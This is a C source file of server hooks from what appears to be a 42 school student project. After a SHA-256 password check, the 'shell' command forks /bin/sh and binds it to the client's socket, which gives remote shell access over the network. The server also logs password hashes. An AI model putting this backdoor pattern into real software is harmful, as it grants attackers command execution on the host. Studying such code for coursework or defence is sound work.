/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_hooks.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/21 13:28:48 by mbatty            #+#    #+#             */
/*   Updated: 2025/11/21 23:08:00 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ctx.h"

static int	check_client_password(t_ctx *ctx, t_client *client, char *msg)
{
	if (!client->logged)
	{
		char *hashed_msg = sha256(msg);
		if (!strcmp(hashed_msg, PASSWORD))
		{
			logger_log(ctx, LOG_LOG, "Client %d correct password (%s)", client->id, hashed_msg);
			server_send_to_id(&ctx->server, client->id, CORRECT_PASSWORD_TEXT);
			server_send_to_fd(client->fd, PROMPT);
			client->logged = true;
			free(hashed_msg);
			return (0);
		}
		logger_log(ctx, LOG_LOG, "Client %d wrong password (%s)", client->id, hashed_msg);
		server_send_to_id(&ctx->server, client->id, INCORRECT_PASSWORD_TEXT);
		free(hashed_msg);
		return (0);
	}
	return (1);
}

static void	start_remote_shell(t_ctx *ctx, t_client *client)
{
	logger_log(ctx, LOG_LOG, "Client %d shell command entered", client->id);
	server_send_to_id(&ctx->server, client->id, RVRS_SHELL_TEXT);

	client->shell_pid = fork();
	if (client->shell_pid == 0)
	{
		setsid();

		dup2(client->fd, STDOUT_FILENO);
		dup2(client->fd, STDERR_FILENO);
		dup2(client->fd, STDIN_FILENO);

		logger_log(ctx, LOG_INFO, "Sucessfully forked, spawning shell");
		ctx_delete(ctx, false);

		char	*argv[] = {"/bin/sh", NULL};
		execv("/bin/sh", argv);
		exit(0);
	}
}

void	message_hook(t_client *client, char *msg, void *ptr)
{
	t_ctx	*ctx = ptr;

	if (!check_client_password(ctx, client, msg))
		return ;

	logger_log(ctx, LOG_LOG, "From %d: %s", client->id, msg);

	if (!strcmp(msg, "shell"))
	{
		start_remote_shell(ctx, client);
		return ;
	}
	else if (!strcmp(msg, "help"))
	{
		logger_log(ctx, LOG_LOG, "Client %d help command entered", client->id);
		server_send_to_id(&ctx->server, client->id, HELP_TEXT);
	}
	else if (!strcmp(msg, "quit"))
	{
		logger_log(ctx, LOG_LOG, "Client %d quit command entered", client->id);
		ctx->running = false;
		return ;
	}
	else
		server_send_to_id(&ctx->server, client->id, UNKNOWN_COMMAND_TEXT);
	server_send_to_fd(client->fd, PROMPT);
}

void	connect_hook(t_client *client, void *ptr)
{
	t_ctx	*ctx = ptr;

	server_send_to_id(&ctx->server, client->id, WELCOME_TEXT);
	server_send_to_id(&ctx->server, client->id, PASSWORD_PROMPT_TEXT);
	logger_log(ctx, LOG_INFO, "Client %d joined", client->id);
}

void	disconnect_hook(t_client *client, void *ptr)
{
	t_ctx	*ctx = ptr;

	logger_log(ctx, LOG_INFO, "Client %d left", client->id);
}
